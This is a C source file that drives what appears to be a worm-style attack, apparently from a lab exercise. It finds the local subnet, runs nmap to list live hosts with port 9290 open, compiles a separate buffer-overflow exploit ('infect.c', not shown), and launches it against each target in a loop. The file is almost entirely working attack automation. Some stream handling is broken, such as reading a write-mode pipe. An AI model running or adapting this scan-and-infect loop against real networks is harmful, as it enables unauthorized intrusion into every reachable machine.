#include <stdio.h>
#include <stdlib.h>
#include <string.h>



int main(int argc, char *argv[])
{

    FILE *ip;
    FILE *router;
    FILE *devices;
    FILE *mask;
    FILE *ports;
    FILE *dupdel;
    FILE *copyvar;
    FILE *prepare;
    FILE *linecount;
    char ipch;
    char routerip;
    char deviceip;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;
  



    //Find local IP (change adapter to eth0 for portability)
    ip = popen("/sbin/ifconfig enp0s3 | grep inet | awk '{print $2}'| cut -f2 -d: > /tmp/local.txts", "r");
    if (ip == NULL)
    {
        printf("Unable to find IP address");
        return(1);
    }

    while((ipch = fgetc(ip)) != EOF)
        putchar(ipch);
    pclose(ip);



    //Find router IP and save to file
    router = popen("ip route | grep default | awk '{print $3}' > /tmp/router.txt", "r");
    if (router == NULL)
    {
        printf("no server info");
        return(1);
    }
    



    //Append router IP address with netmask to specify the scale of the scan (24 lowest, 8 highest)
    mask = popen("sed -i '$ s/$/\\/24/' /tmp/router.txt", "w");
    fclose(mask);



    //Find device IP addresses that are connected to the router
    devices = popen("nmap -n -sn -iL /tmp/router.txt -oG - | awk '/Up$/{print $2}' > /tmp/devices.txt", "r");
    if (devices == NULL)
    {
        printf("No devices found");
        return(1);
    }
    pclose(devices); 



    //Find device IP addresses that are connected to vuln.c with open port
    ports = popen("nmap -open -p 9290 -iL /tmp/devices.txt -oG - | awk '/Host: /{print $2}' > /tmp/targets.txt", "r");
    if (ports == NULL)
    {
        printf("No port info");
        return(1);
    }
    pclose(ports);



    //Remove duplicate addresses from list of targets
    dupdel = popen("sort -u -o /tmp/targets.txt /tmp/targets.txt", "r");
    fclose(dupdel); 
    


    //Compile and prepare seperate buffer overflow program
    prepare = popen("gcc infect.c -o infect", "r");
    fclose(prepare); 



    //Iterate for each address in text file
    linecount = fopen("/tmp/targets.txt", "r");
    if (linecount == NULL) {
        perror("fopen");
        return (1);
    }

    while ((nread = getline(&line, &len, linecount)) != -1) 
    {
        //Store target IP in shell variable '$var'
        copyvar = popen("var=$(</tmp/targets.txt)", "r");
        if (copyvar == NULL)
        {
            printf("no var info");
            return(1);
        }
        //Send input to overflow buffer
        fprintf(copyvar, "./infect $var 9290"); 
        fclose(copyvar);
        fwrite(line, nread, 1, stdout);
    }
    free(line);
    fclose(linecount);

    return(0);
}
